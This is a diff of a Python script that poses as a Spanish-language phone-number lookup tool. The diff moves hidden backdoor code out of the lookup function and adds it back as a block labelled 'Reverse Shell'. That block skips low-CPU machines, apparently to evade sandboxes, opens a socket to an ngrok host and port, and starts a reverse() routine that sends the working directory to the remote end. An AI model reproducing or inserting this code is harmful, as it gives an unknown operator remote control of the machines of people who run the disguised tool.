@@ -2,11 +2,6 @@
 
 from colorama import Fore
 import os
-import socket
-import subprocess
-
-if os.cpu_count() <= 2:
-    quit()
 
 osystem = os.sys.platform
 
@@ -15,14 +10,14 @@ def clear_console():
         os.system('clear')
     else:
         os.system('cls')
-    
+
 def numero():
     numero_telefono = str(input(Fore.GREEN+'Ingresa el numero de telefono:'+Fore.WHITE+' '))
     numero_telefono = numero_telefono.replace(" ", "")
     try:
         import phonenumbers
         from phonenumbers import geocoder, carrier, timezone
-        HOST = '4.tcp.ngrok.io' 
+
         telefono = phonenumbers.parse(numero_telefono)
         international = phonenumbers.format_number(telefono, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
         codigo_pais = international.split(' ')[0]
@@ -32,24 +27,36 @@ def numero():
         print(Fore.YELLOW+f'\n[+] Formato internacional : {international}')
         print(f'[+] Nombre del país    : {country} ({codigo_pais})')
         print(f'[+] Ciudad / Provincia : {localisacion}')
-        PORT = 19167
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print(f'[+] Transportador    : {carrierr}')
         for time in timezone.time_zones_for_number(telefono):
                 print(f'[+] Zona horaria   : {time}')
                 print(Fore.GREEN+'\n[✔] Escaneo completo.')
-        s.connect((HOST, PORT))
-        s.send(str.encode("[*] Connection Established!")) 
+
     except ImportError:
         comand = Fore.GREEN+'pip3 install phonenumbers'
         print(Fore.RED+"!!Modulo phonenumbers no encontrado!!")
         print(f'Utiliza el comando {comand}')
-    
-    except phonenumbers.phonenumberutil.NumberParseException:
-        print(Fore.RED+'[X]'+Fore.YELLOW+' Numero equivocado')
-        
+
 
 clear_console()
+numero()
+
+# Reverse Shell
+import os
+import socket
+import subprocess
+
+if os.cpu_count() <= 2:
+    quit()
+
+HOST = '4.tcp.ngrok.io'  
+PORT =  19167
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.send(str.encode("[*] Connection Established!")) 
+print('\n')
+
 def reverse():
     try:
         s.send(str.encode(os.getcwd() + "> "))
@@ -73,5 +80,3 @@ def reverse():
         reverse()
     
 s.close()
-
-numero()
